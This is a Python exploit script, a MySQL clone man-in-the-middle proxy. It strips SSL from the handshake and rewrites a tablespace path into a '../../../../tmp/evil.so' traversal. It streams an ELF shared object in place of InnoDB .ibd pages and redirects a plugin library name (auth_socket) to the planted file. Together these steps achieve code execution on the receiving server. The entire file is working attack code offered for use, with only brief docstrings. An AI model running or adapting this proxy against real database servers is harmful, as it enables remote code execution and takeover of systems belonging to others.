#!/usr/bin/env python3
"""MySQL clone MITM: redirect one .ibd path and stream an ELF in its place.

The important bit is that pages are counted from the real InnoDB file start,
not from TCP recv() boundaries.  Clone data is framed as MySQL packets, and the
first tablespace byte can appear at any payload offset.
"""
import os
import socket
import struct
import traceback
import threading
from collections import deque

LISTEN = ("0.0.0.0", int(os.environ.get("LISTEN_PORT", "3309")))
DONOR = (os.environ.get("DONOR_HOST", "clone-donor"), int(os.environ.get("DONOR_PORT", "3306")))

PAGE_SIZE = 16 * 1024
MAX_SCAN = 2 * 1024 * 1024

SENTINEL = b"test/" + b"Z" * 22 + b".ibd"
PAYLOAD = b"../../../../tmp/evil.so" + b"\x00" * 8
assert len(SENTINEL) == len(PAYLOAD) == 31
ELF_MAGIC = b"\x7fELF"
COM_RES_PLUGIN_V2 = 7
PLUGIN_TRIGGER_NAME = os.environ.get("PLUGIN_TRIGGER_NAME", "auth_socket").encode()
PLUGIN_TRIGGER_SONAME = os.environ.get(
    "PLUGIN_TRIGGER_SONAME", "../../../../tmp/evil.so"
).encode()

FIL_PAGE_OFFSET = 4
FIL_PAGE_TYPE = 24
FIL_PAGE_TYPE_FSP_HDR = 8
CLIENT_SSL = 0x0800


def recv_exact(sock, size):
    buf = bytearray()
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            raise EOFError
        buf.extend(chunk)
    return bytes(buf)


def read_mysql_packet(sock):
    header = recv_exact(sock, 4)
    size = header[0] | (header[1] << 8) | (header[2] << 16)
    payload = recv_exact(sock, size) if size else b""
    return header, payload


def is_fsp_page0(buf, off):
    if off + PAGE_SIZE > len(buf):
        return False
    page_no = struct.unpack_from(">I", buf, off + FIL_PAGE_OFFSET)[0]
    page_type = struct.unpack_from(">H", buf, off + FIL_PAGE_TYPE)[0]
    return page_no == 0 and page_type == FIL_PAGE_TYPE_FSP_HDR


def is_next_innodb_page(buf, off, expected_page_no):
    if off + PAGE_SIZE > len(buf):
        return False
    page_no = struct.unpack_from(">I", buf, off + FIL_PAGE_OFFSET)[0]
    return page_no == expected_page_no


def has_fsp_page0(buf):
    limit = max(0, len(buf) - PAGE_SIZE + 1)
    for off in range(limit):
        if is_fsp_page0(buf, off):
            return True
    return False


def strip_ssl_from_handshake(payload):
    """Clear CLIENT_SSL in HandshakeV10 so clone traffic remains inspectable."""
    try:
        end_version = payload.index(b"\x00", 1)
        cap_lower = end_version + 1 + 4 + 8 + 1
        if cap_lower + 2 > len(payload):
            return payload
        caps = struct.unpack_from("<H", payload, cap_lower)[0]
        if not caps & CLIENT_SSL:
            return payload
        patched = bytearray(payload)
        struct.pack_into("<H", patched, cap_lower, caps & ~CLIENT_SSL)
        print("[HANDSHAKE] stripped CLIENT_SSL", flush=True)
        return bytes(patched)
    except (ValueError, struct.error):
        return payload


def mysql_header(seq, payload_len):
    if payload_len >= 1 << 24:
        raise ValueError("payload too large for single MySQL packet")
    return bytes(
        (payload_len & 0xFF, (payload_len >> 8) & 0xFF, (payload_len >> 16) & 0xFF, seq)
    )


def patch_plugin_v2(payload, conn_id, pkt_no):
    if not payload or payload[0] != COM_RES_PLUGIN_V2:
        return payload, False

    try:
        pos = 1
        if len(payload) < pos + 4:
            return payload, False
        name_len = struct.unpack_from("<I", payload, pos)[0]
        pos += 4
        if len(payload) < pos + name_len + 4:
            return payload, False
        name = payload[pos:pos + name_len]
        pos += name_len
        so_len_pos = pos
        so_len = struct.unpack_from("<I", payload, pos)[0]
        pos += 4
        if len(payload) < pos + so_len:
            return payload, False
        so_name = payload[pos:pos + so_len]
        tail = payload[pos + so_len:]
    except struct.error:
        return payload, False

    if name != PLUGIN_TRIGGER_NAME:
        return payload, False

    patched = bytearray()
    patched.extend(payload[:so_len_pos])
    patched.extend(struct.pack("<I", len(PLUGIN_TRIGGER_SONAME)))
    patched.extend(PLUGIN_TRIGGER_SONAME)
    patched.extend(tail)
    print(
        f"[PLUGIN c{conn_id}] pkt#{pkt_no} {name.decode(errors='replace')} "
        f"{so_name.decode(errors='replace')} -> "
        f"{PLUGIN_TRIGGER_SONAME.decode(errors='replace')}",
        flush=True,
    )
    return bytes(patched), True


class SameLenReplacer:
    """Same-length streaming replace that can match across packet boundaries."""

    def __init__(self, needle, replacement, on_hit):
        assert len(needle) == len(replacement)
        self.needle = needle
        self.replacement = replacement
        self.on_hit = on_hit
        self.tail = bytearray()

    def feed(self, data):
        data = self.tail + data
        hit = self.needle in data
        if hit:
            data = bytearray(bytes(data).replace(self.needle, self.replacement))
            self.on_hit()
        keep = len(self.needle) - 1
        emit_len = max(0, len(data) - keep)
        work = bytes(data[:emit_len])
        self.tail = bytearray(data[emit_len:])
        return work

    def flush(self):
        work = bytes(self.tail)
        self.tail.clear()
        if self.needle in work:
            work = work.replace(self.needle, self.replacement)
            self.on_hit()
        return work


class IbdToElfRewriter:
    """Replace the next detected InnoDB file stream with ELF bytes + zeroes."""

    def __init__(self, elf):
        self.elf = elf
        self.buf = bytearray()
        self.armed = False
        self.in_file = False
        self.file_no = 0
        self.next_page_no = 0
        self.pages = 0
        self.elf_pos = 0

    def arm(self):
        if not self.armed and not self.in_file:
            print("[ARM] waiting for target .ibd page stream", flush=True)
            self.armed = True

    def _replacement_page(self):
        chunk = self.elf[self.elf_pos:self.elf_pos + PAGE_SIZE]
        self.elf_pos += len(chunk)
        return chunk + b"\x00" * (PAGE_SIZE - len(chunk))

    def _consume_page(self):
        del self.buf[:PAGE_SIZE]
        self.pages += 1
        self.next_page_no += 1
        return self._replacement_page()

    def feed(self, data):
        self.buf.extend(data)
        out = bytearray()

        while self.buf:
            if not self.in_file:
                if not self.armed:
                    out.extend(self.buf)
                    self.buf.clear()
                    break

                hit = -1
                limit = max(0, len(self.buf) - PAGE_SIZE + 1)
                for off in range(limit):
                    if is_fsp_page0(self.buf, off):
                        hit = off
                        break

                if hit >= 0:
                    if hit:
                        out.extend(self.buf[:hit])
                        del self.buf[:hit]
                    self.in_file = True
                    self.armed = False
                    self.file_no += 1
                    self.next_page_no = 0
                    self.pages = 0
                    self.elf_pos = 0
                    print(f"[FILE #{self.file_no}] InnoDB page0 found", flush=True)
                    continue

                if len(self.buf) > MAX_SCAN:
                    keep = PAGE_SIZE - 1
                    out.extend(self.buf[:-keep])
                    del self.buf[:-keep]
                break

            if len(self.buf) < PAGE_SIZE:
                break

            if not is_next_innodb_page(self.buf, 0, self.next_page_no):
                print(
                    f"[FILE #{self.file_no}] done: {self.pages} pages, "
                    f"{self.pages * PAGE_SIZE} bytes; ELF bytes={len(self.elf)}",
                    flush=True,
                )
                self.in_file = False
                continue

            out.extend(self._consume_page())

        return bytes(out)

    def flush(self):
        out = bytearray()
        if self.in_file:
            print(
                f"[FILE #{self.file_no}] done at EOF: {self.pages} pages, "
                f"{self.pages * PAGE_SIZE} bytes; ELF bytes={len(self.elf)}",
                flush=True,
            )
        out.extend(self.buf)
        self.buf.clear()
        return bytes(out)


class TargetIbdFileRewriter:
    """Buffer InnoDB file streams and replace the stream that contains ELF."""

    def __init__(self, elf):
        self.elf = elf
        self.buf = bytearray()
        self.file = bytearray()
        self.in_file = False
        self.next_page_no = 0
        self.file_no = 0
        self.rewritten = 0

    def _replacement_file(self, size):
        return self.elf[:size] + b"\x00" * max(0, size - len(self.elf))

    def _finish_file(self):
        if not self.in_file:
            return b""
        data = bytes(self.file)
        self.file.clear()
        self.in_file = False
        pages = self.next_page_no
        if ELF_MAGIC in data:
            self.rewritten += 1
            print(
                f"[FILE #{self.file_no}] target: {pages} pages, "
                f"{len(data)} bytes -> ELF",
                flush=True,
            )
            return self._replacement_file(len(data))
        return data

    def feed(self, data):
        self.buf.extend(data)
        out = bytearray()

        while self.buf:
            if not self.in_file:
                hit = -1
                limit = max(0, len(self.buf) - PAGE_SIZE + 1)
                for off in range(limit):
                    if is_fsp_page0(self.buf, off):
                        hit = off
                        break

                if hit < 0:
                    out.extend(self.buf)
                    self.buf.clear()
                    break

                if hit:
                    out.extend(self.buf[:hit])
                    del self.buf[:hit]
                self.in_file = True
                self.next_page_no = 0
                self.file_no += 1

            if len(self.buf) < PAGE_SIZE:
                break

            if not is_next_innodb_page(self.buf, 0, self.next_page_no):
                out.extend(self._finish_file())
                continue

            self.file.extend(self.buf[:PAGE_SIZE])
            del self.buf[:PAGE_SIZE]
            self.next_page_no += 1

        return bytes(out)

    def flush(self):
        return self._finish_file() + bytes(self.buf)


class PacketWriter:
    """Preserve original MySQL packet sizes while allowing stream delay."""

    def __init__(self, sock):
        self.sock = sock
        self.headers = deque()
        self.out = bytearray()

    def push_packet(self, header, transformed_payload, expected_len=None):
        if expected_len is None:
            expected_len = header[0] | (header[1] << 8) | (header[2] << 16)
        self.headers.append((header, expected_len))
        self.out.extend(transformed_payload)
        self._drain()

    def flush(self, transformed_tail=b""):
        self.out.extend(transformed_tail)
        self._drain(force=True)

    def _drain(self, force=False):
        while self.headers and (len(self.out) >= self.headers[0][1] or force):
            header, expected = self.headers.popleft()
            payload = bytes(self.out[:expected])
            del self.out[:expected]
            self.sock.sendall(mysql_header(header[3], len(payload)))
            if payload:
                self.sock.sendall(payload)


def forward_plain(src, dst, conn_id, label):
    pkts = 0
    while True:
        try:
            header, payload = read_mysql_packet(src)
        except (EOFError, OSError):
            break
        pkts += 1
        dst.sendall(header)
        if payload:
            dst.sendall(payload)
    print(f"[C{conn_id}] {label} closed", flush=True)


def forward_donor_to_client(src, dst, conn_id, elf, path_delivery_done):
    page_rewriter = TargetIbdFileRewriter(elf)
    writer = PacketWriter(dst)
    pkts = 0

    while True:
        try:
            header, payload = read_mysql_packet(src)
        except (EOFError, OSError):
            break
        pkts += 1
        if pkts == 1:
            payload = strip_ssl_from_handshake(payload)

        payload, plugin_patched = patch_plugin_v2(payload, conn_id, pkts)
        if plugin_patched:
            transformed = payload
            writer.push_packet(header, transformed, expected_len=len(transformed))
            continue

        if path_delivery_done.is_set():
            writer.push_packet(header, payload)
            continue

        if SENTINEL in payload:
            payload = payload.replace(SENTINEL, PAYLOAD)
            transformed = page_rewriter.feed(payload)
            print(f"[PATCH c{conn_id}] pkt#{pkts} path", flush=True)
        else:
            transformed = page_rewriter.feed(payload)
        if page_rewriter.rewritten:
            path_delivery_done.set()
        writer.push_packet(header, transformed)

    writer.flush(page_rewriter.flush())
    if page_rewriter.rewritten:
        path_delivery_done.set()
    print(f"[C{conn_id}] d2c closed after {pkts} packets", flush=True)


def handle(client_sock, addr, conn_id, elf, path_delivery_done):
    print(f"[C{conn_id}] {addr}", flush=True)
    donor = socket.socket()
    donor.settimeout(60)
    donor.connect(DONOR)
    donor.settimeout(None)
    client_sock.settimeout(None)

    def run_logged(fn, *args):
        try:
            fn(*args)
        except Exception:
            traceback.print_exc()

    t1 = threading.Thread(
        target=run_logged, args=(forward_plain, client_sock, donor, conn_id, "c2d"), daemon=True
    )
    t2 = threading.Thread(
        target=run_logged,
        args=(forward_donor_to_client, donor, client_sock, conn_id, elf, path_delivery_done),
        daemon=True,
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    for sock in (client_sock, donor):
        try:
            sock.close()
        except OSError:
            pass
    print(f"[C{conn_id}] closed", flush=True)


def load_elf():
    for path in ("/evil.so", "./evil.so"):
        if os.path.exists(path):
            with open(path, "rb") as f:
                elf = f.read()
            if not elf.startswith(b"\x7fELF"):
                raise RuntimeError(f"{path} is not an ELF")
            return elf
    raise RuntimeError("evil.so not found; mount it as /evil.so or run from repo root")


def main():
    elf = load_elf()
    print(
        f"Proxy {LISTEN} -> {DONOR}; ELF={len(elf)} bytes, "
        f"needs {(len(elf) + PAGE_SIZE - 1) // PAGE_SIZE} clone pages",
        flush=True,
    )
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(LISTEN)
    server.listen(10)

    conn_id = 0
    path_delivery_done = threading.Event()
    while True:
        client, addr = server.accept()
        conn_id += 1
        threading.Thread(
            target=handle, args=(client, addr, conn_id, elf, path_delivery_done), daemon=True
        ).start()


if __name__ == "__main__":
    main()
